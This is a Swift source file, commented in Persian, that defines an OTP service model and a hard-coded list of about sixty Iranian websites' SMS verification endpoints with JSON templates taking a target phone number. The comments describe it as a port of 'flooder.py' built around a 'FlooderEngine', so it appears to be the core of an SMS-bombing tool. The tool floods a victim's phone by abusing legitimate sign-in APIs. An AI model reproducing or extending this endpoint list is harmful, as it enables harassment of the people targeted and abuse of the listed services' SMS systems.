import Foundation
import SwiftUI

/// یک سرویس OTP (کپی مستقیم از flooder.py)
struct OTPService: Identifiable, Hashable {
    enum NumberFormat: String, Hashable {
        case none
        case plus98   // +98xxxxxxxxxx (Namava, Zigap)
        case bare98   // 98xxxxxxxxxx (Achareh)
    }

    let id: UUID
    let name: String
    let url: String
    let dataTemplate: [String: Any]
    var numberFormat: NumberFormat
    var active: Bool

    init(
        name: String,
        url: String,
        dataTemplate: [String: Any],
        numberFormat: NumberFormat = .none,
        active: Bool = true
    ) {
        self.id = UUID()
        self.name = name
        self.url = url
        self.dataTemplate = dataTemplate
        self.numberFormat = numberFormat
        self.active = active
    }

    static func == (lhs: OTPService, rhs: OTPService) -> Bool {
        lhs.id == rhs.id
    }

    func hash(into hasher: inout Hasher) {
        hasher.combine(id)
    }

    /// جایگزینی {n} در URL (مثل اسنپ V2) و اجباری‌سازی https
    func resolvedURL(for number: String) -> URL? {
        let replaced = url.replacingOccurrences(of: "{n}", with: number)
        guard var components = URLComponents(string: replaced) else { return nil }
        components.scheme = "https"
        return components.url
    }

    /// بدنه JSON با جایگزینی {n}
    func bodyData(for number: String) -> Data? {
        let json = Self.json(dataTemplate)
            .replacingOccurrences(of: "{n}", with: number)
        return json.data(using: .utf8)
    }

    /// قالب‌بندی شماره متناسب با هر سرویس
    func formattedNumber(_ raw: String) -> String {
        let base = FlooderEngine.formatNumber(FlooderEngine.normalizeDigits(raw))
        guard base.count > 1 else { return base }
        switch numberFormat {
        case .plus98:
            return "+98" + base.dropFirst()
        case .bare98:
            return "98" + base.dropFirst()
        case .none:
            return base
        }
    }

    /// JSON فشرده با کلیدهای مرتب (معادل json.dumps پایتون)
    private static func json(_ object: [String: Any]) -> String {
        guard let data = try? JSONSerialization.data(withJSONObject: object, options: [.sortedKeys]),
              let string = String(data: data, encoding: .utf8) else {
            return "{}"
        }
        return string
    }

    /// ۶۰ سرویس OTP واقعی (مطابق flooder.py)
    static let allServices: [OTPService] = [
        // ===== Snapp =====
        OTPService(name: "Snapp", url: "https://api.snapp.ir/api/v1/sms/link", dataTemplate: ["phone": "{n}"]),
        OTPService(name: "Snapp V2", url: "https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&cellphone={n}", dataTemplate: ["cellphone": "{n}"]),

        // ===== Divar =====
        OTPService(name: "Divar", url: "https://api.divar.ir/v5/auth/authenticate", dataTemplate: ["phone": "{n}"]),

        // ===== Tapsi =====
        OTPService(name: "Tapsi", url: "https://api.tapsi.ir/api/v2.2/user", dataTemplate: ["credential": ["phoneNumber": "{n}", "role": "PASSENGER"], "otpOption": "SMS"]),

        // ===== Digikala =====
        OTPService(name: "Digikala V1", url: "https://api.digikala.com/v1/user/authenticate/", dataTemplate: ["username": "{n}", "otp_call": false]),
        OTPService(name: "Digikala V2", url: "https://api.digikala.com/v1/user/forgot/check/", dataTemplate: ["username": "{n}"]),

        // ===== Alibaba =====
        OTPService(name: "Alibaba", url: "https://www.alibaba.ir/api/v2/signin/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Namava =====
        OTPService(name: "Namava", url: "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", dataTemplate: ["UserName": "{n}"], numberFormat: .plus98),

        // ===== Bitpin =====
        OTPService(name: "Bitpin", url: "https://api.bitpin.org/v2/usr/signin/", dataTemplate: ["phone": "{n}"]),

        // ===== Achareh =====
        OTPService(name: "Achareh", url: "https://api.achareh.co/v2/accounts/login/", dataTemplate: ["phone": "{n}"], numberFormat: .bare98),

        // ===== Jabama =====
        OTPService(name: "Jabama", url: "https://gw.jabama.com/api/v4/account/send-code", dataTemplate: ["mobile": "{n}"]),

        // ===== Banimode =====
        OTPService(name: "Banimode", url: "https://mobapi.banimode.com/api/v2/auth/request", dataTemplate: ["phone": "{n}"]),

        // ===== Gap (پیام‌رسان) =====
        OTPService(name: "Gap", url: "https://core.gap.im/api/v3.1/Account/Login", dataTemplate: ["Type": "sms", "Username": "{n}"]),

        // ===== Rubika =====
        OTPService(name: "Rubika", url: "https://messengerg2c54.iranlms.ir/v3/updateUserAgent", dataTemplate: ["phone_number": "{n}"]),

        // ===== Filimo =====
        OTPService(name: "Filimo", url: "https://www.filimo.com/api/v3/user/login/otp", dataTemplate: ["phone": "{n}"]),

        // ===== Torob =====
        OTPService(name: "Torob", url: "https://api.torob.com/auth/send-otp/", dataTemplate: ["phone_number": "{n}"]),

        // ===== Sheypoor =====
        OTPService(name: "Sheypoor", url: "https://www.sheypoor.com/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== SnappFood =====
        OTPService(name: "SnappFood", url: "https://snappfood.ir/api/v1/auth/otp", dataTemplate: ["phone": "{n}"]),

        // ===== DigikalaJet =====
        OTPService(name: "DigikalaJet", url: "https://api.digikalajet.ir/user/login-register/", dataTemplate: ["phone": "{n}"]),

        // ===== Alopeyk =====
        OTPService(name: "Alopeyk", url: "https://api.alopeyk.com/v2/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== SnappMarket =====
        OTPService(name: "SnappMarket", url: "https://app.snappmarket.ir/api/v1/auth/otp", dataTemplate: ["phone": "{n}"]),

        // ===== SnappTrip =====
        OTPService(name: "SnappTrip", url: "https://app.snapptrip.ir/api/v1/auth/otp", dataTemplate: ["phone": "{n}"]),

        // ===== MrBilit =====
        OTPService(name: "MrBilit", url: "https://api.mrbilit.com/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Flightio =====
        OTPService(name: "Flightio", url: "https://flightio.com/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Takhfifan =====
        OTPService(name: "Takhfifan", url: "https://api.takhfifan.com/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Okala =====
        OTPService(name: "Okala", url: "https://okala.com/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Delino =====
        OTPService(name: "Delino", url: "https://www.delino.com/user/register", dataTemplate: ["mobile": "{n}"]),

        // ===== Bit24 =====
        OTPService(name: "Bit24", url: "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile", dataTemplate: ["mobile": "{n}"]),

        // ===== Taaghche =====
        OTPService(name: "Taaghche", url: "https://gw.taaghche.com/v4/site/auth/signup", dataTemplate: ["contact": "{n}"]),

        // ===== Shab =====
        OTPService(name: "Shab", url: "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile", dataTemplate: ["mobile": "{n}"]),

        // ===== Kilid =====
        OTPService(name: "Kilid", url: "https://api.kilid.ir/auth/v1/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Karnaval =====
        OTPService(name: "Karnaval", url: "https://api.karnaval.ir/users/phone/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Nobat =====
        OTPService(name: "Nobat", url: "https://nobat.ir/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== DrDr =====
        OTPService(name: "DrDr", url: "https://drdr.ir/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Aparat =====
        OTPService(name: "Aparat", url: "https://www.aparat.com/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Filmnet =====
        OTPService(name: "Filmnet", url: "https://api.filmnet.ir/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Zigap =====
        OTPService(name: "Zigap", url: "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp", dataTemplate: ["phoneNumber": "{n}"], numberFormat: .plus98),

        // ===== Doctoreto =====
        OTPService(name: "Doctoreto", url: "https://doctoreto.com/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== SnappDoctor =====
        OTPService(name: "SnappDoctor", url: "https://snappdoctor.ir/api/v1/auth/otp", dataTemplate: ["phone": "{n}"]),

        // ===== Bimito =====
        OTPService(name: "Bimito", url: "https://bimito.ir/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Otaghak =====
        OTPService(name: "Otaghak", url: "https://otaghak.com/api/v1/auth/send-code", dataTemplate: ["phone": "{n}"]),

        // ===== Salamati24 =====
        OTPService(name: "Salamati24", url: "https://salamati24.com/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Allinco =====
        OTPService(name: "Allinco", url: "https://api.allinco.ir/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Komodaa =====
        OTPService(name: "Komodaa", url: "https://komodaa.com/api/v1/auth/otp", dataTemplate: ["mobile": "{n}"]),

        // ===== IraniCard =====
        OTPService(name: "IraniCard", url: "https://iranicard.ir/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== AbanTether =====
        OTPService(name: "AbanTether", url: "https://abantether.com/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Dosma =====
        OTPService(name: "Dosma", url: "https://app.dosma.ir/api/v1/account/send-otp/", dataTemplate: ["mobile": "{n}"]),

        // ===== Ostadkar =====
        OTPService(name: "Ostadkar", url: "https://api.ostadkar.com/login", dataTemplate: ["mobile": "{n}"]),

        // ===== Tebinja =====
        OTPService(name: "Tebinja", url: "https://www.tebinja.com/api/v1/users", dataTemplate: ["username": "{n}"]),

        // ===== SnappExpress =====
        OTPService(name: "SnappExpress", url: "https://express.snapp.ir/api/v1/auth/otp", dataTemplate: ["phone": "{n}"]),

        // ===== SnappBox =====
        OTPService(name: "SnappBox", url: "https://app.snappbox.ir/api/v1/auth/otp", dataTemplate: ["phone": "{n}"]),

        // ===== Paklean =====
        OTPService(name: "Paklean", url: "https://client.api.paklean.com/download", dataTemplate: ["tel": "{n}"]),

        // ===== Timcheh =====
        OTPService(name: "Timcheh", url: "https://timcheh.com/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Digistyle =====
        OTPService(name: "Digistyle", url: "https://digistyle.com/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Miare =====
        OTPService(name: "Miare", url: "https://www.miare.ir/api/otp/driver/request/", dataTemplate: ["phone_number": "{n}"]),

        // ===== Baarbaanet =====
        OTPService(name: "Baarbaanet", url: "https://baarbaanet.com/api/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Rojashop =====
        OTPService(name: "Rojashop", url: "https://rojashop.com/api/send-otp-register", dataTemplate: ["mobile": "{n}"]),

        // ===== BimehCom =====
        OTPService(name: "BimehCom", url: "https://www.bimeh.com/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== BimeBazar =====
        OTPService(name: "BimeBazar", url: "https://bimebazar.com/api/v1/auth/send-otp", dataTemplate: ["phone": "{n}"]),

        // ===== Samantajhiz =====
        OTPService(name: "Samantajhiz", url: "https://www.samantajhiz.com/api/auth/send-otp", dataTemplate: ["phone": "{n}"]),
    ]
}
